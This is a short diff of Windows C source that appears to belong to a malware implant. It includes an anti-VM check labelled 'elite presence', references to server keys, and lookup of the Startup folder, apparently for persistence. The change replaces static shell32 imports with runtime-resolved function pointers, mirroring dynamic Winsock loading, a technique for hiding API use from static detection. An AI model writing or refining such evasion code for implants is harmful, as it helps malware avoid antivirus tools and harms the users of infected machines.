@@ -33,6 +33,7 @@
 extern VOID SyncThreadFunction();
 extern PWCHAR GetRandomString(ULONG uMin);
 extern PDYNAMIC_WINSOCK dynamicWinsock;
+extern PDYNAMIC_SHELL32 dynamicShell32;
 
 //extern BYTE pServerKey[32];
 //extern BYTE pConfKey[32];
@@ -121,6 +122,11 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	if(!API_LoadWinsock(&dynamicWinsock))
 		return 0;
 
+	/* init dynamic shell32 */
+	if((dynamicShell32 = (PDYNAMIC_SHELL32) malloc(sizeof(DYNAMIC_SHELL32))) == NULL)
+		return 0;
+	if(!API_LoadShell32(&dynamicShell32))
+		return 0;
 
 	// first check for elite presence
 	BOOL bVM = AntiVM();
@@ -294,10 +300,12 @@ VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest)
 HRESULT CreateItemFromParsingName(__in LPWSTR strFileName, __out  IShellItem **psi)
 {
 	PIDLIST_ABSOLUTE pidl;
-	HRESULT hr = SHParseDisplayName(strFileName, 0, &pidl, SFGAO_FOLDER, 0);
+	//HRESULT hr = SHParseDisplayName(strFileName, 0, &pidl, SFGAO_FOLDER, 0);
+	HRESULT hr = dynamicShell32->fpSHParseDisplayName(strFileName, 0, &pidl, SFGAO_FOLDER, 0);
 	if (SUCCEEDED(hr))
 	{
-		hr = SHCreateShellItem(NULL, NULL, pidl, psi);
+		//hr = SHCreateShellItem(NULL, NULL, pidl, psi);
+		hr = dynamicShell32->fpSHCreateShellItem(NULL, NULL, pidl, psi);
 		if (SUCCEEDED(hr))
 			return S_OK;
 	}
@@ -654,7 +662,8 @@ PWCHAR GetStartupPath()
 	PWCHAR pStartupPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
 	PWCHAR pShortPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
 	
-	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, FALSE);
+	//SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, FALSE);
+	dynamicShell32->fpSHGetSpecialFolderPathW(NULL, pStartupPath, CSIDL_STARTUP, FALSE);
 	GetShortPathName(pStartupPath, pShortPath, 4096);
 
 	free(pStartupPath);
